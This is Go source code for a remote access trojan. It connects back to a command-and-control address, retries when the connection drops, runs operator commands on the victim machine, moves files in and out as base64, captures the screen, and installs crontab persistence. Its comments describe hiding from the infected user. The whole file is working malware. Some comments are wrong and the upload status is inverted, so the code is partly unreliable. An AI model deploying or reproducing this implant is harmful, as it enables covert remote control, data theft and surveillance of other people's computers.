package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec" // Allows interaction with external system commands
	"strings"
	"time"

	"github.com/kbinani/screenshot" // Init module before import; import used to capture screen
)

const C2 string = "127.0.0.1:1234" // Localhost for test purposes
// Real case needs public IP

func main() {

	conn := connect_home()

	for {

		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "q" || cmd == "quit" {
			send_resp(conn, "Closing Connection...")
			conn.Close()
			break
		} else if cmd[0:2] == "cd" {

			if cmd == "cd" {
				cwd, err := os.Getwd()
				if err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, cwd)
				}

			} else {
				target_dir := strings.Split(cmd, " ")[1]     // Split cmd into parts sep by spaces looking for target dir as second arg
				if err := os.Chdir(target_dir); err != nil { // Switches dir and checks error all in one
					send_resp(conn, err.Error()) // Error not nil meanin there was error
				} else {
					send_resp(conn, target_dir)
				}
			}
		} else if strings.Contains(cmd, ":") { // Colon means file upload command
			tmp := strings.Split(cmd, ":")
			if save_file(tmp[0], tmp[1]) { // base64 file was decoded after being encoded
				send_resp(conn, "File uploaded successfully.")
			} else {
				send_resp(conn, "Error uploading file")

			}
		} else if tmp := strings.Split(cmd, " "); tmp[0] == "download" {
			send_resp(conn, get_file(tmp[1])) // Passing the name of the file we want to download

		} else if cmd == "screenshot" { // take screenshot of victim screen and send back to C2
			send_resp(conn, take_screenshot())

		} else if cmd == "persist" {
			send_resp(conn, persist())

		} else {
			send_resp(conn, exec_command(cmd))
		}
	}
}

func persist() string {
	file_name := "/tmp/persist" // Etc is where important system config files live on linux
	file, _ := os.Create(file_name)
	exec_path, _ := os.Executable()                                        // Path of current script
	fmt.Fprintf(file, "@reboot %s\n", exec_path)                           // Cron restarts the script on reboot now
	_, err := exec.Command("/usr/bin/crontab", file_name).CombinedOutput() // Restarts the script on reboot
	os.Remove(file_name)
	if err != nil {
		return "Error establishing persistence"
	} else {
		return "Persistence has been established successfully"
	}
}

func connect_home() net.Conn {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(time.Second * 30) // If connection error sleep then try to reconnect
		return connect_home()
	}
	return conn
}

func send_resp(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s", msg)
}

func save_file(file_name string, b64_string string) bool {

	temp := b64_string[2 : len(b64_string)-1]
	content, _ := base64.StdEncoding.DecodeString(temp)
	if err := os.WriteFile(file_name, content, 0644); err == nil {
		return false // File already exists
	}
	return true // Save does not exist, save it
}

func get_file(file string) string {
	if !file_exists(file) {
		return "File  not found."
	} else {
		return file + ":" + file_b64(file) // File exists, encode and return
	}
}

func file_exists(file string) bool {
	if _, err := os.Stat(file); err != nil {
		return false // nil has a value so file does not exist
	}
	return true
}

func file_b64(file string) string {
	content, _ := os.ReadFile(file)
	return base64.StdEncoding.EncodeToString(content) // Convert to b64 and return it
}

func take_screenshot() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("wallpaper.png")
	defer file.Close()
	png.Encode(file, img)
	b64_string := file_b64("wallpaper.png")

	os.Remove("wallpaper.png") // Removed to stay undetectable on indected computer so user does not see a random image created

	return b64_string
}

func exec_command(cmd string) string {
	output, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	} else {
		return string(output) // Output returned as array of bytes so we cast it to a string
	}
}
